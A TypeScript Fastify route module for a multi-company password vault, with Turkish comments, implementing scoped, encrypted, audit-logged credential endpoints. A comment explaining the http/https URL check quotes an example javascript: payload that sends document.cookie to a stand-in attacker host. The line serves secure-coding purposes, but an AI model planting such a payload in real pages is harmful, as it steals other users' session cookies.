import { FastifyPluginAsyncZod } from 'fastify-type-provider-zod';
import { z } from 'zod';
import { Prisma } from '@prisma/client';
import { encrypt, decrypt } from '../../utils/crypto.js';
import { createAuditLog } from '../../middleware/audit.js';
import { getStaffCompanyScope, isCompanyInScope, resolveCompanyFilter } from '../../utils/staff-scope.js';
import { commonErrorResponses, successResponseSchema } from '../../utils/api-schema.js';
import { t } from '../../i18n/index.js';

/**
 * Kasa kaydının URL'i — yalnızca http/https.
 *
 * Bu değer arayüzde tıklanabilir bir `<a href>` olarak gösteriliyor ve React,
 * `javascript:` şemasını ENGELLEMİYOR (yalnızca geliştirme uyarısı basar). Şema
 * kısıtlanmazsa `javascript:fetch('//evil.tld?c='+document.cookie)` kaydedilip
 * bir başka yöneticiye tıklatılabilir — eşit yetkili biri arasında yanal hareket
 * ve kasa denetim izinin etrafından dolaşma.
 */
const httpUrl = z
  .string()
  .trim()
  .max(2048)
  .refine(
    (v) => {
      if (v === '') return true;
      try {
        return ['http:', 'https:'].includes(new URL(v).protocol);
      } catch {
        return false;
      }
    },
    { message: 'URL yalnızca http:// veya https:// ile başlayabilir' },
  );

const createSchema = z.object({
  title: z.string().trim().min(1).max(200),
  category: z.string().trim().max(100).optional(),
  url: httpUrl.optional(),
  username: z.string().trim().max(200).optional(),
  password: z.string().min(1).max(1000),
  notes: z.string().max(5000).optional(),
  companyId: z.string().cuid().optional(),
});

const updateSchema = createSchema.partial();
const credentialIdParamsSchema = z.object({ id: z.string().min(1).max(128) });
const credentialListQuerySchema = z.object({ companyId: z.string().min(1).max(128).optional() });
const credentialSummarySchema = z.object({
  id: z.string(),
  title: z.string(),
  category: z.string().nullable(),
  url: z.string().nullable(),
  username: z.string().nullable(),
  companyId: z.string().nullable(),
  createdAt: z.date(),
  updatedAt: z.date(),
  company: z.object({ name: z.string() }).nullable(),
});
const credentialMutationSchema = z.object({ id: z.string(), title: z.string() });
const responseOf = <T extends z.ZodTypeAny>(data: T) => z.object({ success: z.literal(true), data });

/**
 * Şifre kasası — `admin` ve `it_manager`.
 *
 * `admin`      → tüm kayıtlar, şirketsiz ("global") olanlar dahil.
 * `it_manager` → YALNIZCA atandığı şirketlerin kayıtları.
 *
 * `companyId = null` olan global kayıtlar (domain admin, root şifreleri gibi
 * çapraz şirket sırları) yalnızca admin'e açıktır — `isCompanyInScope` bunu
 * açıkça uygular.
 *
 * requireRole tek başına yetmez: preHandler yalnızca rolü kontrol eder, şirket
 * kapsamı her handler'ın içinde ayrıca doğrulanmalıdır.
 */
export const credentialRoutes: FastifyPluginAsyncZod = async (app) => {
  // Liste — şifre/not DÖNMEZ
  app.get('/', {
    preValidation: [app.requireRole('admin', 'it_manager')],
    schema: {
      tags: ['Credentials'],
      summary: 'Şifre kasası kayıtlarını listeler',
      querystring: credentialListQuerySchema,
      response: {
        200: responseOf(z.array(credentialSummarySchema)),
        ...commonErrorResponses,
      },
    },
  }, async (request, reply) => {
    const { companyId } = request.query;
    const staffUser = request.staffUser!;
    const scope = await getStaffCompanyScope(app.prisma, staffUser.id, staffUser.role);

    // companyId istemciden gelir — kapsamla kesiştirilir, doğrudan kullanılmaz.
    const entries = await app.prisma.credentialEntry.findMany({
      where: resolveCompanyFilter(scope, companyId),
      orderBy: { title: 'asc' },
      select: {
        id: true, title: true, category: true, url: true, username: true,
        companyId: true, createdAt: true, updatedAt: true,
        company: { select: { name: true } },
      },
    });
    reply.send({ success: true, data: entries });
  });

  // Reveal — çözülmüş şifre + not, audit log'lanır
  app.get('/:id/reveal', {
    preValidation: [app.requireRole('admin', 'it_manager')],
    schema: {
      tags: ['Credentials'],
      summary: 'Şifre kasası kaydını çözer ve denetim kaydı oluşturur',
      params: credentialIdParamsSchema,
      response: {
        200: responseOf(z.object({ password: z.string(), notes: z.string().nullable() })),
        ...commonErrorResponses,
      },
    },
  }, async (request, reply) => {
    const { id } = request.params;
    const staffUser = request.staffUser!;
    const entry = await app.prisma.credentialEntry.findUnique({ where: { id } });
    if (!entry) return reply.status(404).send({ success: false, error: t(request, 'credentials.notFound') });

    // Kapsam kontrolü audit log'dan ÖNCE: reddedilen bir deneme başarılı bir
    // görüntüleme gibi loglanmamalı.
    const scope = await getStaffCompanyScope(app.prisma, staffUser.id, staffUser.role);
    if (!isCompanyInScope(scope, entry.companyId)) {
      return reply.status(403).send({ success: false, error: t(request, 'credentials.accessDenied') });
    }

    await createAuditLog({
      entityType: 'credential',
      entityId: id,
      action: 'credential_reveal',
      changes: { title: entry.title },
      performedBy: staffUser.email,
      ipAddress: request.headers['x-real-ip'] as string,
    });

    reply.send({
      success: true,
      data: { password: decrypt(entry.passwordEnc), notes: entry.notesEnc ? decrypt(entry.notesEnc) : null },
    });
  });

  // Oluştur
  app.post('/', {
    preValidation: [app.requireRole('admin', 'it_manager')],
    schema: {
      tags: ['Credentials'],
      summary: 'Şifre kasası kaydı oluşturur',
      body: createSchema,
      response: { 201: responseOf(credentialMutationSchema), ...commonErrorResponses },
    },
  }, async (request, reply) => {
    const body = request.body;
    const staffUser = request.staffUser!;
    const scope = await getStaffCompanyScope(app.prisma, staffUser.id, staffUser.role);

    // Kapsamlı kullanıcı global kayıt (companyId yok) oluşturamaz — oluştursaydı
    // kendi göremeyeceği bir kayıt üretmiş olurdu. companyId da kapsam içinde olmalı.
    if (scope !== null && !isCompanyInScope(scope, body.companyId)) {
      return reply.status(403).send({
        success: false,
        error: t(request, 'credentials.createScopeDenied'),
      });
    }

    const entry = await app.prisma.credentialEntry.create({
      data: {
        title: body.title,
        category: body.category,
        url: body.url,
        username: body.username,
        passwordEnc: encrypt(body.password),
        notesEnc: body.notes ? encrypt(body.notes) : undefined,
        companyId: body.companyId,
        createdById: staffUser.id,
      },
      select: { id: true, title: true },
    });
    await createAuditLog({
      entityType: 'credential', entityId: entry.id, action: 'create',
      changes: { title: body.title }, performedBy: staffUser.email,
      ipAddress: request.headers['x-real-ip'] as string,
    });
    reply.status(201).send({ success: true, data: entry });
  });

  // Güncelle
  app.put('/:id', {
    preValidation: [app.requireRole('admin', 'it_manager')],
    schema: {
      tags: ['Credentials'],
      summary: 'Şifre kasası kaydını günceller',
      params: credentialIdParamsSchema,
      body: updateSchema,
      response: { 200: responseOf(credentialMutationSchema), ...commonErrorResponses },
    },
  }, async (request, reply) => {
    const { id } = request.params;
    const body = request.body;
    const staffUser = request.staffUser!;

    const existing = await app.prisma.credentialEntry.findUnique({
      where: { id },
      select: { id: true, companyId: true },
    });
    if (!existing) return reply.status(404).send({ success: false, error: t(request, 'credentials.notFound') });

    const scope = await getStaffCompanyScope(app.prisma, staffUser.id, staffUser.role);

    // MEVCUT kayıt kapsam içinde mi? Değilse dokunamaz.
    if (!isCompanyInScope(scope, existing.companyId)) {
      return reply.status(403).send({ success: false, error: t(request, 'credentials.accessDenied') });
    }

    // HEDEF şirket de kapsam içinde mi? Bu kontrol olmadan kapsamlı bir kullanıcı
    // kaydı kendi kapsamına taşıyıp okuyabilir ya da erişilemez hale getirebilir.
    if (body.companyId !== undefined && scope !== null && !isCompanyInScope(scope, body.companyId)) {
      return reply.status(403).send({
        success: false,
        error: t(request, 'credentials.moveScopeDenied'),
      });
    }

    const data: Prisma.CredentialEntryUncheckedUpdateInput = {};
    if (body.title !== undefined) data.title = body.title;
    if (body.category !== undefined) data.category = body.category;
    if (body.url !== undefined) data.url = body.url;
    if (body.username !== undefined) data.username = body.username;
    if (body.companyId !== undefined) data.companyId = body.companyId;
    if (body.password !== undefined) data.passwordEnc = encrypt(body.password);
    if (body.notes !== undefined) data.notesEnc = body.notes ? encrypt(body.notes) : null;

    const entry = await app.prisma.credentialEntry.update({
      where: { id }, data, select: { id: true, title: true },
    });
    await createAuditLog({
      entityType: 'credential', entityId: id, action: 'update',
      changes: { title: entry.title }, performedBy: staffUser.email,
      ipAddress: request.headers['x-real-ip'] as string,
    });
    reply.send({ success: true, data: entry });
  });

  // Sil
  app.delete('/:id', {
    preValidation: [app.requireRole('admin', 'it_manager')],
    schema: {
      tags: ['Credentials'],
      summary: 'Şifre kasası kaydını siler',
      params: credentialIdParamsSchema,
      response: { 200: successResponseSchema, ...commonErrorResponses },
    },
  }, async (request, reply) => {
    const { id } = request.params;
    const staffUser = request.staffUser!;
    const existing = await app.prisma.credentialEntry.findUnique({
      where: { id },
      select: { id: true, companyId: true },
    });
    if (!existing) return reply.status(404).send({ success: false, error: t(request, 'credentials.notFound') });

    const scope = await getStaffCompanyScope(app.prisma, staffUser.id, staffUser.role);
    if (!isCompanyInScope(scope, existing.companyId)) {
      return reply.status(403).send({ success: false, error: t(request, 'credentials.accessDenied') });
    }

    await app.prisma.credentialEntry.delete({ where: { id } });
    await createAuditLog({
      entityType: 'credential', entityId: id, action: 'delete',
      changes: {}, performedBy: staffUser.email,
      ipAddress: request.headers['x-real-ip'] as string,
    });
    reply.send({ success: true });
  });
};
